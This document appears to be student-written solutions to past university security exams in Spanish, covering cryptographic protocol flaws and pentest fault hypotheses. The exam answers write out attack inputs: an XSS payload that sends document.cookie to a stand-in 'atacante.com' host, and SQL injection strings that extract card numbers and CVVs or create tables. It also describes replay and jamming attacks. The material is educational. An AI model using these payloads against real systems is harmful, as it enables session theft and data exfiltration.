    **Limitación:** Esta verificación no es robusta contra un atacante sofisticado que conozca los rangos válidos y manipule los valores cifrados mediante bit-flipping para producir valores plausibles. Para eso se necesitaría agregar integridad a nivel de cada sensor (por ejemplo, que cada sensor incluya un MAC con su identificador privado).
    
2. ¿Puede alguien con capacidad de reemplazar un concentrador (incluso averiguando su identificador privado) falsificar valores de sensores que la central da como válidos? Explicar por qué no o cómo puede hacerlo (1 pto)
    
    Sí, puede falsificar valores que la central daría como válidos. El atacante tiene dos vías de manipulación:
    
    **1. Falsificar el MAC del concentrador:**  
    Si el atacante averiguó el identificador privado del concentrador, puede calcular un HMAC-SHA3 válido sobre cualquier mensaje que quiera. La central verificaría el MAC y lo aceptaría como legítimo. El MAC del concentrador deja de ser una protección útil.
    
    **2. Manipular los valores sensados mediante bit-flipping:**  
    CHACHA20 es un cifrado de flujo, donde `ciphertext = plaintext ⊕ keystream`. El atacante no conoce los identificadores privados de los sensores, por lo que no puede descifrar los valores ni generar cifrados desde cero. Sin embargo, puede hacer bit-flipping sobre el ciphertext: si modifica un bit del cifrado, el bit correspondiente del valor descifrado cambia de forma predecible.
    
    Si el atacante conoce el formato de los valores sensados (por ejemplo, que la presión se representa en ciertos bytes), puede manipular bits específicos para cambiar los valores a algo que esté dentro de rangos normales. La central descifra con la clave del sensor, obtiene un valor plausible, y lo acepta como válido.
    
    **Ejemplo concreto del ataque:**  
    El atacante pincha el tubo y extrae petróleo, lo cual causa una caída de presión. Los sensores detectan la anomalía y cifran el valor real. El atacante intercepta esos mensajes en el concentrador, hace bit-flipping sobre los valores cifrados para que al descifrar den presión normal, recalcula el MAC del concentrador, y envía el mensaje a la central. La central verifica el MAC (válido), descifra los valores (parecen normales), y no genera alarma.
    
    **¿Por qué es posible?**  
    Porque CHACHA20 no provee integridad. No hay forma de que la central detecte que el ciphertext fue modificado. El protocolo carece de autenticación a nivel de sensor individual.
    
3. ¿Puede alguien con capacidad de reemplazar dos concentradores falsificar valores de sensores que la central da como válidos? Explicar por qué no o cómo puede hacerlo. (1 pto)
    
    Sí, y es peor que con un solo concentrador. La razón es la siguiente:
    
    **Con un solo concentrador comprometido**, la central tiene una defensa: cada sensor envía su señal por el cable interno, y esa señal llega tanto al concentrador anterior como al posterior (ya que cada concentrador captura mensajes de la sección anterior y posterior). Si el atacante manipula los valores en un concentrador, la central podría detectar la inconsistencia comparando los valores del mismo sensor reportados por los dos concentradores vecinos. Si un concentrador dice presión normal y el otro dice presión baja para el mismo sensor, algo anda mal.
    
    **Con dos concentradores consecutivos comprometidos**, el atacante controla ambos extremos del segmento de sensores entre ellos. Puede manipular los valores de esos sensores en ambos concentradores de forma consistente — hacer bit-flipping para mostrar presión normal en los dos reportes. La central recibe valores coincidentes de ambos concentradores y no tiene forma de detectar la manipulación.
    
    **El ataque completo:**
    
    1. El atacante toma control de dos concentradores consecutivos y obtiene sus identificadores privados
    2. Pincha el tubo en el segmento entre ambos concentradores
    3. Intercepta los mensajes de los sensores de ese segmento en ambos concentradores
    4. Hace bit-flipping sobre los valores cifrados para que den presión normal en ambos
    5. Recalcula el MAC de ambos concentradores
    6. La central recibe valores consistentes de ambos lados → no genera alarma
    
    **¿Por qué funciona?** Porque la central pierde su único mecanismo de verificación cruzada. Con un solo concentrador comprometido, el concentrador vecino (honesto) sirve de testigo. Con dos consecutivos comprometidos, no hay testigo independiente para los sensores de ese segmento.
    

## **Ejercicio 3**

Una exchange de criptomonedas está expandiendo su aplicación web actual con una nueva aplicación móvil nativa para Android y otra para iOS.

Se sabe que:

- La aplicación se comunica con el servidor mediante una API REST
- La aplicación requiere que el usuario se registre con un email y una contraseña
- Sin autenticarse en la aplicación, se puede ver un resumen del valor actual de compra y venta de cada criptomoneda listada, y datos de volumen de operaciones.
- Para ingresar dinero se puede utilizar una tarjeta de crédito o una cuenta bancaria. Es necesario registrar los datos del medio a utilizar. Para retirar dinero, solo se puede utilizar una transferencia bancaria.
- Los ingresos y salidas de dinero están gestionados por un sistema de pagos externo, AlphaPay, que es quien procesa las operaciones. El proveedor disponibiliza una API para llevar a cabo las transacciones. Dicha API procesa las transacciones, pero no almacena información de medios de pago, que si almacena la plataforma para no requerir al usuario ingresar todos los datos de cuenta en cada transacción.
- La aplicación notifica por email cuando una orden de compra o venta se ejecuta, incluyendo el resumen de la misma.

Ante un pedido de realizar un pentest que abarque la app, establecer 4 hipótesis de falla **pertinentes** para el caso, basadas en problemas de seguridad en aplicaciones. Explicar **para cada una**, cómo probarla según la metodología (la acción concreta que ejecutaría para verificar o refutar la hipótesis). (4 puntos, 1 pto cada uno)

**Aclaración**: No utilizar problemas genéricos como hipótesis de falla. Plantear situaciones y lugares concretos donde podría estar el problema. Por ejemplo, en lugar de decir “puede haber un buffer overflow”, decir “es probable que haya un buffer overflow en la lectura del parámetros x que debe interpretarse como número y puede tener un buffer pequeño asumiendo que el número tiene menos de los dígitos de un long”.

**Hipótesis 1: Falta de certificate pinning en la app móvil — MITM**

- **Qué:** Interceptación del tráfico entre la app móvil y la API REST por falta de certificate pinning.
- **Por qué:** La aplicación es una app móvil nativa nueva (Android e iOS) que se comunica con el servidor vía API REST. Si la app no implementa certificate pinning, un atacante puede instalar un certificado propio en el dispositivo y usar un proxy para interceptar todo el tráfico HTTPS.
- **Cómo:** Se configura un emulador Android/iOS con un proxy (Burp Suite), se instala el certificado del proxy en el dispositivo, y se observa si se puede interceptar y leer el tráfico HTTPS entre la app y la API. Si la app no rechaza el certificado del proxy, la hipótesis se confirma.
- **Impacto:** El atacante puede ver credenciales de login, tokens de sesión, datos de tarjetas de crédito y cuentas bancarias en tránsito. En una exchange de criptomonedas, esto permite robar fondos directamente.

---

**Hipótesis 2: Sensitive Data Exposure — Datos de medios de pago almacenados inseguramente**

- **Qué:** Los datos de tarjetas de crédito y cuentas bancarias se almacenan de forma insegura en la base de datos de la plataforma.
- **Por qué:** El enunciado dice explícitamente que AlphaPay no almacena información de medios de pago, sino que los almacena la plataforma para no requerir que el usuario los ingrese cada vez. Esto significa que datos altamente sensibles (números de tarjeta, CBU/CVU) están en la base de datos de la exchange. El enunciado no menciona cómo se protegen.
- **Cómo:** A través del proxy (hipótesis 1) o accediendo a la API, se examina qué devuelven los endpoints de medios de pago, por ejemplo `GET /api/medios-de-pago`. Se verifica si la respuesta incluye números completos de tarjeta o cuenta en lugar de versiones enmascaradas (como `***1234`). También se intenta SQL injection en endpoints que consulten esos datos para verificar si están cifrados en la base de datos: `' UNION SELECT numero_tarjeta, cvv FROM medios_pago; --`.
- **Impacto:** Si los datos están en texto plano o mal cifrados, una filtración de la base de datos expone datos financieros de todos los usuarios, violando regulaciones PCI.

---

**Hipótesis 3: Broken Access Control — Acceso a órdenes y datos de otros usuarios**

- **Qué:** Un usuario autenticado puede acceder a las órdenes de compra/venta y datos de cuenta de otros usuarios manipulando IDs en los requests.
- **Por qué:** La API REST probablemente usa IDs para identificar órdenes, cuentas y medios de pago (por ejemplo `GET /api/ordenes/{id_orden}`). Si los endpoints solo verifican que el usuario esté autenticado pero no que sea el dueño del recurso, cualquier usuario puede acceder a recursos ajenos.
- **Cómo:** Un usuario autenticado intercepta el request de ver su propia orden, por ejemplo `GET /api/ordenes/1001`. Luego cambia el ID a `GET /api/ordenes/1002`, `GET /api/ordenes/1003`, etc. Si el servidor devuelve órdenes de otros usuarios, la hipótesis se confirma. Se repite con endpoints de medios de pago: `GET /api/medios-pago/5001` y retiro de dinero: `POST /api/retiros` con un `user_id` ajeno.
- **Impacto:** El atacante puede ver saldos, historial de operaciones y datos bancarios de otros usuarios. En el peor caso, podría iniciar retiros a su propia cuenta bancaria usando la sesión de otro usuario.

---

**Hipótesis 4: XSS a través de los emails de notificación de órdenes**

- **Qué:** Cross-Site Scripting inyectado a través de campos que luego aparecen en los emails de notificación.
- **Por qué:** La aplicación notifica por email cuando una orden se ejecuta, incluyendo un resumen de la misma. Si algún campo controlado por el usuario (por ejemplo, el nombre de la criptomoneda en una orden personalizada, o un campo de comentario/referencia) se incluye en el email sin sanitizar, un atacante puede inyectar HTML/JavaScript que se ejecute cuando la víctima abra el email en un cliente web (Gmail, Outlook web).
- **Cómo:** Se crea una orden incluyendo en algún campo de texto: `<script>fetch('<https://atacante.com/?cookie='+document.cookie>)</script>` o HTML malicioso como `<img src="<https://atacante.com/track?email=victima>">`. Se verifica si el email recibido renderiza el HTML/script sin sanitizar.
- **Impacto:** El atacante puede ejecutar código en el navegador de la víctima cuando abre el email, robando cookies de sesión del webmail o redirigiendo a páginas de phishing que imiten el login de la exchange para robar credenciales.

# 21-07-2021

## Ejercicio 1

El consejo deliberante del partido de Tecnociudad solicitó la construcción de un sistema distribuido que permita realizar licitaciones de forma transparente y segura. Cuando el partido necesita contratar cualquier tipo de servicios, genera un pliego con la descripción de lo solicitado y espera que distintos contratistas presenten ofertas. Durante esta fase, los costos son secretos para evitar que un oferente tenga preferencia. Una vez vencido el plazo, se publica la propuesta de cada uno, junto con el precio, y se selecciona el que cumple las condiciones con el menor costo.

La implementación del sistema asegura que estas propiedades ocurran utilizando criptografía. La descripción a alto nivel es la siguiente:

- Se publica la licitación con un ID único asociado
- Por cada licitación, se reciben archivos cifrados con AES-GCM de parte de los oferentes interesados. Los archivos incluyen un documento con el ID de la licitación, la descripción técnica, el CUIT de la empresa y el precio
- Al terminar el período de la licitación los oferentes comparten la clave utilizada, y con ello se revisan todas las ofertas, y se adjudica la ganadora
- Si un oferente no provee la clave, queda automáticamente descalificado
- Para transparencia, se publican todas las ofertas recibidas ya descifradas y la adjudicada en un portal público que puede ser consultado libremente

1. Explicar por qué ningún oferente puede alterar su propuesta sin ser detectado
    
    AES-GCM provee tanto confidencialidad como integridad — genera un tag de autenticación junto con el cifrado. Este tag depende de la clave, el nonce, y el contenido completo del documento. Si el oferente intenta modificar cualquier parte del archivo cifrado (precio, descripción, CUIT), al momento de descifrar con la clave original, la verificación del tag falla y la alteración es detectada.
    
2. Qué medidas adicionales serían necesarias para evitar que algún administrador del sistema ignore a un proveedor diciendo que nunca entregó la clave?
    
    **1. Acuse de recibo firmado digitalmente (No repudio de recepción):**
    
    Cuando el oferente entrega su clave, el sistema debe implementar un intercambio con firmas de ambas partes:
    
    1. El oferente envía la clave firmada: `(clave, id_licitacion, id_oferente, timestamp, Sign_sk_oferente(clave || id_licitacion || id_oferente || timestamp))`
    2. El administrador/sistema firma un acuse de recibo: `(id_licitacion, id_oferente, timestamp, Sign_sk_admin("recibido" || id_licitacion || id_oferente || timestamp))`
    3. El oferente guarda este acuse como prueba
    
    De esta forma:
    
    - El oferente no puede negar que envió la clave (su firma lo vincula)
    - El administrador no puede negar que la recibió (su firma en el acuse lo vincula)
    - Si el administrador dice "nunca entregó la clave", el oferente presenta el acuse de recibo firmado por el administrador como prueba ante un tercero
    
    Se usa firma digital y no MAC porque MAC requiere clave compartida y cualquiera de las dos partes podría haber generado el tag. La firma digital garantiza **no repudio**: cada parte solo puede haber generado su propia firma.
    
    **2. Logs de auditoría (Clark-Wilson C4):**
    
    El sistema debe registrar de forma inmutable:
    
    - Fecha y hora de recepción de cada oferta cifrada
    - Fecha y hora de entrega de cada clave y su acuse de recibo
    - Identidad del oferente y del administrador involucrados
    - Resultado de cada descifrado (exitoso o fallido)
    
    Estos logs deben ser accesibles por un auditor independiente para que ningún administrador pueda eliminar o modificar registros.
    
    **3. Publicación para transparencia:**
    
    Tanto las entregas firmadas como los acuses de recibo podrían publicarse en el portal público. Así cualquier ciudadano puede verificar que todos los oferentes que entregaron clave fueron considerados y ninguno fue ignorado.
    
3. Considerar el caso de un oferente que envía un archivo a nombre de un competidor, con un precio irrisoriamente bajo que lo perjudicaría. Cómo evitar ésto usando funciones criptográficas?
    
    Cada oferente registrado en el sistema tiene un par de claves (sk, pk). La pk se registra en el sistema al momento de inscribirse como proveedor.
    
    Al enviar su oferta, el oferente debe firmarla antes de cifrarla:
    
    1. El oferente arma su documento: `doc = (id_licitacion, descripcion_tecnica, CUIT, precio)`
    2. Firma el documento: `firma = Sign_sk_oferente(H(doc))`
    3. Cifra todo junto con AES-GCM: `archivo = Enc_k(doc || firma)`
    4. Envía el archivo cifrado al sistema
    
    **Verificación:**
    
    Cuando se abre la licitación y el oferente comparte la clave:
    
    1. El sistema descifra el archivo y obtiene `doc || firma`
    2. Busca la pk asociada al CUIT del documento
    3. Verifica `Vrfy_pk_oferente(H(doc), firma)`
    4. Si la verificación falla, la oferta se rechaza
    
    Esto se alinea con la propiedad de **no repudio** de las firmas digitales: solo el poseedor de la sk puede generar firmas válidas, y cualquiera con la pk puede verificarlas.
    

## Ejercicio 2

El siguiente protocolo fue propuesto para que N nodos de un sistema puedan elegir un supervisor, de tal manera que ningún nodo pueda ganar o perder sistemáticamente manipulando el intercambio:

1. Cada nodo genera un valor $r_i$ de 64 bits y envía al resto $H(r_i)$
2. Luego de recibir todos los valores, cada nodo publica $r_i$
3. Cada nodo calcula $r_x = r_i \oplus r_2 \oplus ... \oplus r_n$

El nodo a menor distancia de $r_x$ es el nuevo supervisor, utilizando la distancia de _Hamming_ como métrica (se comparan bit a bit los dígitos binarios de los dos valores, y cada discrepancia suma 1 de distancia — por ejemplo, 0010 y 1110 están a distancia 2). En caso de empate, se reinicia.

1. Explicar por qué el paso 1 es necesario y no se puede comenzar el intercambio con el paso 2 directamente
    
    Es necesario ya que se trata de un commitment scheme; el proceso de Hasheo de los r_i originales asegura que ningún nodo pueda luego cambiar su valor original r_i para ser supervisor. Si fuese a comenzar con el paso 2, algún nodo puede quedarse esperando para ver los valores de r_i publicados y manipular su r_i para que coincida o tenga la menor distancia de Hamming con el r_x. Matemáticamente hablando:
    
    Sea `r_parcial = r_1 ⊕ r_2 ⊕ ... ⊕ r_{n-1}`
    
    Sabe que `r_x = r_parcial ⊕ r_n`. Entonces puede probar distintos valores de r_n y ver qué r_x resulta de cada uno. Elige el r_n que produzca un r_x cuya distancia de Hamming sea mínima a su propio identificador → se elige a sí mismo como supervisor.
    
2. Considerar el caso de solo tres nodos. Qué pasaría si el nodo 2, por ejemplo, decide abusar el sistema, y repite el paso 1 — el valor de $H(r_1)$ como si fuese el suyo? Proponer una modificación simple que evite el problema
    
    Si el nodo 2 publicase H(r1) entonces su r2 = r1. Esto implica que:
    
    $r_x=r_1 \oplus r_2 \oplus r_3 = r_1 \oplus r_1 \oplus r_3 = r_3$
    
    Entonces el nodo 2 sabe de antemano que r_x = r_3 y puede utilizar este dato para manipular las elecciones.
    
    Para esto podrian:
    
    Modificar el paso 1 para que cada nodo incluya su identificador dentro del hash: en lugar de enviar `H(r_i)`, enviar `H(r_i || i)` donde `i` es el identificador único del nodo.
    
    En la fase de revelación, cada nodo publica su r_i y los demás verifican calculando `H(r_i || i)` usando el identificador real del nodo.
    
    **¿Por qué esto evita el ataque?** Si el nodo 2 copia el hash del nodo 1, es decir envía `H(r_1 || 1)` como propio, en la fase de revelación tiene dos opciones:
    
    - Presentar r_1: los demás calculan `H(r_1 || 2)` (porque saben que es el nodo 2), que no coincide con `H(r_1 || 1)` → trampa detectada.
    - Buscar un r' tal que `H(r' || 2) = H(r_1 || 1)`: esto requiere encontrar una colisión en la función de hash → computacionalmente inviable.
3. Proponer una mejora al algoritmo para que no sea necesario repetir todo el intercambio en caso de empate y siempre se llegue a un resultado que no pueda ser manipulado
    
    En caso de empate, se podria considerar ir comparando los n-1 bits del prefijo hasta llegar al bit 1. Nunca puede empatar en este caso y mas si se asegura que los hashes que se publican en el primer paso sean distintos ya que por la propiedad de resistencia a colisiones, un mismo hash no puede ser producido por dos mensajes distintos. Entonces, 1) asegurar que los hashes en el primer paso sean distintos o publicar otro hash y 2) ir comparando los primeros n-1, n-2, … 1 bit del prefijo usando la distancia de Hamming hasta sacar a un ganador.
    

## Ejercicio 3

Agrolin S.A. se dedica a la construcción de soluciones tecnológicas para el campo. Recientemente se publicó un informe que menciona múltiples vulnerabilidades en uno de sus productos y provocó muchas pérdidas de ventas a punto de concretarse. Para corregir la situación, la empresa decidió contratar un servicio de _pen testing_, realizar una evaluación más exhaustiva y corregir el producto para empezar a recuperar el daño a su imagen.  
El producto en cuestión permite hacer un seguimiento del rendimiento de las cosechas a lo largo del tiempo y determinar las rotaciones óptimas para mejorar la productividad. El sistema está compuesto por un frontend web que es un single page web app, donde el usuario puede registrarse, autenticarse, dar de alta lotes marcando sus límites en un mapa, actualizarlos o eliminarlos. El sistema muestra según datos históricos de todos los clientes de la zona, el rinde esperado para la superficie en cuestión, sugiere el tipo de cultivo con mayor rentabilidad en función de los valores de rinde y precios de mercados futuros estimados, y permite que el usuario ingrese los datos del tipo de cultivo y luego de la cosecha el rinde obtenido para comparar y poder mejorar en las próximas sugerencias.  
La aplicación web se ejecuta en los navegadores de cada cliente, y hace llamadas a un servidor backend a través de un API REST.  
**Siguiendo la metodología de hipótesis de falla, establecer 4 hipótesis de vulnerabilidades que tengan alta probabilidad de existir en el escenario descripto. Para cada una, describir únicamente la hipótesis y la prueba que realizaría para confirmarla o refutarla (1 pto. por hipótesis).**  
**Aclaraciones:** No se considerarán válidas hipótesis genéricas. Tampoco se considerarán dos hipótesis que sean variantes del mismo tipo de falla (por ejemplo, el mismo problema en dos pantallas distintas).

**Hipótesis 1**  
Improper authentication

- Hipótesis: El sistema cuenta con un sistema de autenticación débil o inexistente, que permite loguearse fácilmente a cuentas que no son propias para modificar datos o obtener datos de otros clientes. Es posible que no tenga sistema de autorización directamente, o use un sistema username-password que permite contraseñas débiles y realizar intentos ilimitados.
- Prueba: Primero, tratar de entrar al sitio para ver si tiene algún sistema de autorización, en caso de que no lo tenga, entrar y ver una cuenta cualquiera. En caso que tenga, una prueba fácil de hacer es tratar de registrarse con credenciales simples como 'usuario' y 'contraseña', que son fácilmente adivinables. Luego, es posible realizar un ataque por diccionario en que se prueben varias contraseñas comunes para ver si podemos tener acceso.

**Hipótesis 2**  
SQL-Injection

- Hipótesis: Al ingresar datos del campo, es posible ingresar sentencias SQL en lugares de valores normales, para provocar modificaciones en la base de datos, esto puede producirse por falta de validaciones que verifiquen los datos de entrada.
- Prueba: Tras crearme una cuenta, puedo introducir datos como por ejemplo: para insertar el nombre del campo, en lugar de poner solo un nombre inserto `nombre; CREATE TABLE INGRESE_A_TU_BASE(int hola);'`. En caso de que no haya validaciones, se creará la tabla sin realizar daños a la base de datos.

**Hipótesis 3**  
Denial of Service (DOS)

- Hipótesis: Se menciona que el sistema puede _"muestra según datos históricos de todos los clientes de la zona, el rinde esperado para la superficie en cuestión, sugiere el tipo de cultivo con mayor rentabilidad en función de los valores de rinde y precios de mercados futuros estimados"_. Este tipo de consulta es costosa, ya que hay que realizar varias querys y parsear los resultados, lo que genera un desbalance entre el tiempo necesario para enviar una request y lo necesario para resolver esta consulta. Por lo que es posible que si un atacante envía muchas de estas consultas en forma paralela, logre denegar el servicio por sobrecapacidad del servidor.
- Prueba: NO se va a realizar este ataque para no tirar la página en caso de ser exitoso. A lo sumo se verificará si es posible realizar 2 consultas desde el mismo IP (con o sin autenticarse) y se informará de la situación eventualmente.

**Hipótesis 4**  
Improper Authorization

- Hipótesis: Una vez logueados, es posible que el sistema no maneje bien permisos y/o autorizaciones. De esta forma, es posible que se le permita al usuario acceder a recursos que no se le debería dar acceso, como el campo de otro cliente o recursos de administrador.
- Prueba: Para probar esto, tras crear una cuenta y loguearme, podría verificar la forma que tiene una URL que muestra campo creado por mí. Si tiene la forma: `https://agrolin.app.com/cliente/12/campo/1`, podría tratar de acceder al campo de otro cliente usando la URL `https://agrolin.app.com/cliente/1/campo/1`, accediendo a recursos no deseados. No modificaría nada para no ser intrusiva la prueba, solo se muestra que se tuvo acceso, pero un atacante eventualmente podría borrar campos, etc.

# 06-07-2021

## Ejercicio 1

El concejo deliberante del partido de Tecnociudad solicitó la construcción de un sistema distribuido que permita realizar referendos (votaciones de toda la población) asiduamente y transparentar algunos actos de gobierno.  
El sistema requiere poder garantizar que no haya votos duplicados, y al mismo tiempo garantizar el anonimato de las votaciones.  
El sistema propuesto es el siguiente:

- Cada persona elige un numero aleatorio, y genera un identificador unico `IDp = H(Rp || D.N.I.)` donde `H(x)` es una función de hash libre de colisiones.
- A la hora de votar el usuario carga el `IDp` y el sistema registra el voto con el par `(IDp, valor votado)`
- Al terminar la elección se cuentan los votos, y se publica el padrón de `IDps` asociado a cada resultado.
- Cualquier persona puede verificar que su voto se computo correctamente consultando el padrón, también se puede observar que no haya `IDps` duplicados

1. Explicar por qué nadie puede saber el voto de una persona (un DNI) en particular (1 pto.)
    
    Debido al uso de la función Hash, que por propiedad no es invertible (no hay forma de obtener el valor original). Además, tampoco se puede buscar por fuerza bruta (dado que un DNI tiene 10^8 posibilidades) en términos computacionales pues está concatenado con un número aleatorio que actúa como SALT para proteger contra ataques de rainbow tables.
    
2. Pensar y explicar cómo es posible en este sistema que una persona efectúe múltiples votaciones (1 pto).
    
    Una persona puede elegir distintos números aleatorios y publicar en el sistema los distintos IDp’s con su valor votado.  
    Tampoco se menciona si el sistema tiene guardado el número aleatorio y el DNI de cada persona (no hay mención sobre si se verifica que el DNI sea válido) por lo que además de elegir un número aleatorio distinto, además puede incluso usar DNIs falsos para manipular los resultados a su favor.
    
3. Proponer una mejora al sistema que evite el problema del punto anterior, sin perder la propiedad de anonimato (1 pto).
    
    Es necesario que el sistema cuente con una metodología que garantice la integridad del votante.
    
    1. Persona se presenta con DNI → sistema verifica y le da token T → marca DNI como usado → borra relación DNI↔T
    2. Persona vota anónimamente con T → sistema verifica T válido y no usado → registra voto → invalida T

## Ejercicio 2

Considerar el siguiente algoritmo que puede ser utilizado para que dos sistemas se puedan sincronizar en un valor, 0 o 1, sin que ninguno de los dos pueda influenciar el valor:

1. A genera r1 y envía a B H(r1)
2. B genera r2 y envía a A H(r2) cuando ambos reciben el valor de la otra parte
3. A envía r1 a B
4. B envía r2 a A

A y B calculan x = (r1 & 1) xor (r2 & 1) (o sea el xor entre los bits menos significativos de r1 y r2)  
**a) Explicar por qué son necesarios los pasos 1 y 2. ¿Qué verificación adicional deberían hacer A y B no mencionada en la descripción anterior? (1 pto.)**

Los pasos 1 y 2 son necesarios para que ninguna de las partes pueda influenciar el resultado. Funcionan como un **commitment scheme**:

- En el paso 1, A se compromete a su valor r1 enviando H(r1). Como el hash no es invertible, B no puede saber r1 y por lo tanto no puede elegir un r2 que manipule el resultado.
- En el paso 2, B se compromete a su valor r2 enviando H(r2). Mismo razonamiento: A no puede saber r2.
- Recién en los pasos 3 y 4 revelan los valores reales.

**Verificación faltante:** Cuando A recibe r2 en el paso 4, debe calcular H(r2) y verificar que coincida con lo que recibió en el paso 2. Análogamente, cuando B recibe r1 en el paso 3, debe calcular H(r1) y verificar que coincida con lo que recibió en el paso 1.

Si no coincide, significa que la otra parte cambió su valor después de ver el del otro → trampa detectada. Esto funciona por la propiedad de **resistencia a segundas preimágenes**: A no puede encontrar un r1' ≠ r1 tal que H(r1') = H(r1).  
**b) Suponer que B reciba H(r1) y reenvía ese valor a A en el paso 2 ¿que conseguiría hacer? Proponer alguna modificación que lo evite (1,5 ptos.)**

Entonces x = (r1 & 1) xor (r1 & 1) = 0 por lo que B sabe de antemano que el resultado siempre será 0, sin importar qué eligió A. B controló el resultado sin conocer r1.

Para evitar esto, en vez de enviar simplemente H(r1) deberia incluir la identidad del emisor dentro del hash:

`Paso 1: A envía H("A" || r1) Paso 2: B envía H("B" || r2)`

Si B intenta reenviar H("A" || r1) como su commitment, en el reveal tendría que presentar un r2 tal que H("B" || r2) = H("A" || r1). Pero como el hash es resistente a colisiones, no puede encontrar tal r2. Al verificar, el sistema detecta que H("B" || r2) ≠ H("A" || r1) y la trampa queda expuesta.  
c) Modificar el algoritmo para que A y B se pongan de acuerdo en el valor de un byte en lugar de un bit. (0.5 ptos).

Reemplazar la máscara de 1 bit por una máscara de 8 bits (un byte):

`x = (r1 & 0xFF) xor (r2 & 0xFF)`

`0xFF` = 255 = 11111111 en binario, que extrae los 8 bits menos significativos de cada valor. El XOR de dos bytes da un byte, es decir un valor entre 0 y 255.

## Ejercicio 3

Agrolin S.A. Se dedica a la construcción de soluciones tecnológicas para el campo.  
En estos momentos está desarrollando una nueva línea de productos que automatizan la cosecha. El producto insignia, **robo-cosecha**, consiste en un sistema compuesto por dos drones, una cosechadora autónoma y un sistema de control integrado.  
El cliente delimita en el sistema de control la zona a cosechar indicando los límites en un mapa. Con esa información, un dron sobrevuela el terreno extrayendo imágenes que permiten determinar las zonas aún no cosechadas. Con el mapa de zonas a cosechar se programa el recorrido de la cosechadora. Como medida adicional, el segundo dron sobrevuela el camino delante de la cosechadora para detectar movimientos o anomalías y de esta manera enviar la información para que la cosechadora frene y no ocurra ningún accidente.  
Los sistemas de mapeo de campo, análisis de cosechas y conducción autónoma de la cosechadora, ya existen, dado que fueron desarrollados por separado anteriormente como productos independientes. Ya han sido probados en campo y funcionan correctamente.  
El diferencial de este nuevo producto es integrar todo y conectarlo de forma que ocurra automáticamente todo el proceso. Para ello, la **base** donde corre el software se comunica **punto a punto con los drones y la cosechadora** y actúa como el **coordinador** de la operación.  
Las conexiones son por **radiofrecuencia** con un protocolo basado en datagramas que da una abstracción similar a **UDP**. Sobre eso se construyó una capa segura que brinda autenticación e integridad, similar a **TLS** (o mejor dicho a dTLS, la variante de TLS pensada para datagramas). El software de la base está desarrollado en **Java**. El de los drones y la cosechadora, en **C++**.  
Siguiendo la metodología de hipótesis de falla, establecer 4 hipótesis de vulnerabilidades que tengan alta probabilidad de existir en el escenario descrito. Para cada una, describir únicamente la hipótesis y la prueba que realizan para confirmar o refutar (1 pto. por hipótesis)

**Hipótesis 1: Falta de confidencialidad en la comunicación por radiofrecuencia**  
**Hipótesis:** La capa segura brinda "autenticación e integridad" pero no se menciona confidencialidad. Si las comunicaciones no están cifradas, un atacante con un receptor de radiofrecuencia puede capturar toda la información que viaja entre la base, los drones y la cosechadora: las imágenes del terreno, el mapa de zonas a cosechar, las coordenadas de la cosechadora, y las rutas programadas. Esto expone información comercialmente sensible del cliente (qué está cosechando, cuánto, dónde).  
**Prueba:** Con un receptor de radiofrecuencia en la misma banda (SDR - Software Defined Radio), posicionarse cerca del campo durante una operación y capturar los paquetes transmitidos. Analizar si el contenido de los datagramas es legible en texto plano o si está cifrado. Si se pueden leer las coordenadas, imágenes o instrucciones, la hipótesis se confirma.

**Hipótesis 2: Buffer overflow en el software C++ de drones y cosechadora**  
**Hipótesis:** Los drones y la cosechadora corren software en C++, que requiere manejo manual de memoria. Si los parsers que procesan los mensajes de la base no validan correctamente el tamaño de los datos recibidos, un atacante podría enviar paquetes malformados con datos más grandes de lo esperado, causando un buffer overflow. Esto podría provocar que el dron se caiga (crash), que la cosechadora se comporte erráticamente, o en el peor caso permitir ejecución de código arbitrario.  
**Prueba:** Utilizando un transmisor de radiofrecuencia en la misma banda, enviar paquetes que sigan el formato del protocolo pero con campos de tamaño excesivo (por ejemplo, coordenadas con miles de dígitos, o imágenes de tamaño anómalo). Observar si los drones o la cosechadora crashean, se reinician, o se comportan erráticamente. Para una prueba más controlada, realizar fuzzing del parser C++ en un entorno de laboratorio con los mismos binarios.

**Hipótesis 3: Jamming / Denial of Service en la señal de frenado del dron de seguridad**

**Hipótesis:** La comunicación es por radiofrecuencia, que es susceptible a jamming (interferencia intencional). El segundo dron sobrevuela delante de la cosechadora y envía información para que frene ante anomalías. Si un atacante interfiere la señal entre el dron de seguridad y la base (o entre la base y la cosechadora), la cosechadora no recibiría la orden de frenar. El punto crítico es: ¿qué hace la cosechadora si pierde comunicación? Si sigue avanzando por defecto (fail-open), podría causar un accidente. Si frena por defecto (fail-safe), un atacante puede detener la operación a voluntad.

**Prueba:** Con un transmisor de radiofrecuencia, generar interferencia en la banda utilizada por el sistema durante una operación. Observar el comportamiento de la cosechadora: ¿frena automáticamente al perder señal (fail-safe) o sigue avanzando (fail-open)? Ambos resultados son informativos: fail-open es un riesgo de seguridad física, fail-safe es un vector de DoS.

**Hipótesis 4: Replay attack — reenviar comandos capturados**

**Hipótesis:** La capa segura brinda autenticación e integridad (tipo dTLS), pero al ser un protocolo basado en datagramas (UDP), los paquetes pueden llegar desordenados. Si el protocolo no implementa protección anti-replay adecuada (ventana de números de secuencia), un atacante puede capturar paquetes legítimos de la radiofrecuencia y reenviarlos después. Por ejemplo, capturar un comando de "avanzar a coordenada X" y reenviarlo cuando la cosechadora debería estar frenada, o reenviar un "zona limpia" del dron de seguridad cuando hay un obstáculo.

**Prueba:** Con un receptor SDR, capturar paquetes durante una operación normal. Luego, con un transmisor, reenviar esos paquetes exactos durante otra operación o en un momento diferente. Verificar si la cosechadora o los drones aceptan y ejecutan los comandos reenviados. Si los ejecutan, no hay protección anti-replay.

# 13-07-2020

## Ejercicio 1

Una empresa está desarrollando un chip que puede insertarse bajo la piel para exponer información de cualquier tipo. Sus usos iniciales están asociados a información de contacto ante emergencias e información médica, pero el chip puede ser utilizado para almacenar cualquier tipo de información.  
Para ello, el chip cuenta con **32 compartimentos de 1024 bytes**. Cada compartimiento posee una **clave de escritura y una clave de lectura**. Las claves de escritura y lectura son diferentes para cada compartimiento y aleatorias, pero todos los chips tienen las mismas claves.  
Cuando alguien “compra” uno de los 32 espacios del chip, obtiene el par de claves asociados para poder modificar ese compartimiento.  
Para escribir el compartimiento, el chip debe recibir utilizando una **transmisión por proximidad (NFC)** una trama con el siguiente formato:

`Header (4 Bytes) || Size (2 Bytes) || Data (Variable)`  
Donde:

- Header son 4 bytes con valor fijo compuesto por los valores ASCII de las letras “MTRX”
- Size es un número entre 0 y 1024 indicando la cantidad de información a guardar
- Data es la información a guardar.

Toda la trama viaja cifrada utilizando AES-GCM con la clave de escritura correspondiente.

